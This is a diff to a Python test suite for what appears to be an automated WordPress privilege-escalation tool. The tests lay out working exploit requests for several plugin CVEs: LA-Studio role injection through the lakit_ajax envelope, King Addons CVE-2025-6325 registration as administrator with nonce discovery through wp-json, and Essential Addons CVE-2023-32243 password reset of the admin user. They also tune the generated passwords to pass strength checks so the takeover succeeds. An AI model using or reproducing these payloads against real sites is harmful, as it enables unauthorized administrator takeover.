@@ -1,3 +1,5 @@
+import json
+import re
 from unittest.mock import MagicMock
 from wp import recipes as wp_recipes
 from wp import privesc as wp_privesc
@@ -13,26 +15,40 @@ def test_privesc_recipe_present():
     assert r["role_param"] == "lakit_bkrole"
     assert r["role_value"] == "administrator"
     assert r["affected"] == "<=1.5.6.3"
+    assert r["action"] == "lakit_ajax"
+    assert r["envelope"] == {"subaction": "register", "id": "0"}
 
 
-def test_acquire_admin_sends_role_injection():
+def test_acquire_admin_sends_role_injection_inside_actions_envelope():
+    # LA-Studio's lakit_ajax dispatcher nests the real sub-action + its fields
+    # as JSON under `actions`; the malicious lakit_bkrole rides inside that
+    # nested `data`, not as a flat top-level POST field.
     http = MagicMock()
+    http.get.return_value = MagicMock(status_code=200, text=
+        'var LaStudioKitSettings = {"ajaxNonce":"ABCDEFNONCE","homeURL":"https://t/"};')
     http.post.return_value = MagicMock(status_code=200, text="ok")
     out = wp_privesc.acquire_admin("https://t/", http, _recipe(),
                                    creds={"username": "svc_x", "email": "x@y.z", "password": "pw123"})
     # returns the creds it tried to create
     assert out == {"username": "svc_x", "password": "pw123"}
-    # posted to admin-ajax with the malicious role param
+    # posted to admin-ajax with the dispatcher action + nonce at the top level
     url, = http.post.call_args[0]
     assert url == "https://t/wp-admin/admin-ajax.php"
     data = http.post.call_args[1]["data"]
-    assert data["lakit_bkrole"] == "administrator"
-    assert data["action"] == "lastudio_register"
-    assert data["user_login"] == "svc_x"
+    assert data["action"] == "lakit_ajax"
+    assert data["_nonce"] == "ABCDEFNONCE"
+    inner = json.loads(data["actions"])["0"]
+    assert inner["action"] == "register"
+    assert inner["data"]["lakit_bkrole"] == "administrator"
+    assert inner["data"]["username"] == "svc_x"
+    assert inner["data"]["password-confirm"] == "pw123"
+    assert inner["data"]["lakit_field_log"] == "yes"
 
 
 def test_acquire_admin_random_creds_are_unique():
-    http = MagicMock(); http.post.return_value = MagicMock(status_code=200)
+    http = MagicMock()
+    http.get.return_value = MagicMock(status_code=200, text="")
+    http.post.return_value = MagicMock(status_code=200)
     a = wp_privesc.acquire_admin("https://t", http, _recipe())
     b = wp_privesc.acquire_admin("https://t", http, _recipe())
     assert a["username"] != b["username"]
@@ -242,6 +258,44 @@ def test_register_role_harvests_js_localized_nonce_with_object_scoping():
     assert out == {"username": "svc_k", "password": "pw12345678"}
 
 
+def test_register_role_falls_back_to_page_discovery_when_front_page_lacks_nonce():
+    # King Addons renders register_nonce only on the page that shows the
+    # Login|Register widget, so nonce_from.url "/" comes back empty. The code
+    # must then discover the widget page via wp-json and harvest from there --
+    # otherwise the registration is rejected with "Security check failed" and no
+    # admin account is ever created (the live failure mode on cve-kingaddons).
+    http = MagicMock()
+
+    def _get(url, **kw):
+        r = MagicMock(status_code=200)
+        if "wp/v2/pages" in url:
+            r.json.return_value = [{"id": 7, "link": "https://t/member-login/"}]
+            r.text = ""
+        elif url.rstrip("/").endswith("/member-login"):
+            r.text = ('king_addons_login_register_vars = '
+                      '{"login_nonce":"aaa","register_nonce":"DISCOVERED"};')
+            r.json.return_value = {}
+        else:  # front page "/" -- no widget, no nonce
+            r.text = "<html>front</html>"
+            r.json.return_value = {}
+        return r
+
+    http.get.side_effect = _get
+    http.post.return_value = MagicMock(status_code=200, text="ok")
+    r = {"kind": "register-role", "endpoint": "/wp-admin/admin-ajax.php",
+         "action": "king_addons_user_register",
+         "user_field": "username", "email_field": "email", "pass_field": "password",
+         "pass_confirm_field": "confirm_password",
+         "role_param": "user_role", "role_value": "administrator",
+         "nonce_from": {"url": "/", "key": "register_nonce",
+                        "object": "king_addons_login_register_vars", "param": "nonce"}}
+    wp_privesc.acquire_admin("https://t", http, r,
+        creds={"username": "svc_k", "email": "k@b.c", "password": "pw12345678"})
+    data = http.post.call_args.kwargs["data"]
+    assert data["nonce"] == "DISCOVERED"
+    assert data["user_role"] == "administrator"
+
+
 # ── password-reset with a page-harvested JS nonce + confirm field ─────────────
 # Essential Addons CVE-2023-32243: reset_password() on `init` sets any user's
 # password without validating rp_key, gated only by a nonce (action
@@ -350,3 +404,24 @@ def test_essential_addons_registry_recipe_wires_end_to_end():
     assert data["eael-pass2"] == out["password"]
     assert data["rp_login"] == "admin"
     assert data["page_id"] == "124" and data["widget_id"] == "224"
+
+
+def test_random_creds_password_satisfies_strength_gate():
+    # Some registration handlers (e.g. King Addons CVE-2025-6325's
+    # Security_Manager::validate_password_strength) reject a new account unless
+    # the password is >=8 chars AND hits at least 3 of 4 character classes
+    # (upper/lower/digit/special). A hex-only token clears length but only 2
+    # classes, so the account is silently never created and the privesc "fails"
+    # for a reason that has nothing to do with the vuln. Every generated
+    # password must clear a 4-of-4 bar so it survives any such gate.
+    upper = re.compile(r"[A-Z]")
+    lower = re.compile(r"[a-z]")
+    digit = re.compile(r"\d")
+    special = re.compile(r"""[!@#$%^&*(),.?":{}|<>]""")
+    for _ in range(200):
+        pw = wp_privesc._random_creds()["password"]
+        assert len(pw) >= 12, f"too short: {pw!r}"
+        assert upper.search(pw), f"no uppercase: {pw!r}"
+        assert lower.search(pw), f"no lowercase: {pw!r}"
+        assert digit.search(pw), f"no digit: {pw!r}"
+        assert special.search(pw), f"no special: {pw!r}"
